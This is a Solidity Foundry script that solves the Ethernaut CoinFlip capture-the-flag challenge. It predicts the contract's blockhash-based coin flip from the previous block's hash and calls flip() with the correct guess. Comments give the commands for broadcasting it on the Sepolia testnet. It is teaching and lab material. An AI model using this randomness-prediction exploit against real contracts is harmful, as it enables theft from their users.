// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../src/Coinflip.sol";

// source .env      # This is to store the environmental variables in the shell session
// forge script script/Coinflip.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

// If you want to see the consecutiveWins value after the attack, you can use this in the console:
// cast call $COINFLIP_INSTANCE "consecutiveWins" --rpc-url $SEPOLIA_RPC_URL


// For this particular challenge, I recommend using remix to deploy this contract and run the attack, because foundry simulates 
// the tx first and then broadcasts it, and the blockhash may not be the same as the one used in the tx simulation.

contract CoinFlipSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("COINFLIP_INSTANCE"));

    /* Attack idea: we can predict the outcome of the coin flip by using the blockhash of the previous block.
    before sending the flip function. We can then use this information to always win the coin flip.
    Notice that since the coinflip check the lastHash value with the current blockhash, we need to make more than one call to the flip function.
    */
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {

        vm.startBroadcast(deployerPrivateKey);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip coinFlipInstance = CoinFlip(instance);
        // We call the flip function with the correct guess
        // In the coinflip contract 1=true, 0=false
        coinFlipInstance.flip(side);
        console.log("consecutiveWins: ", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }


}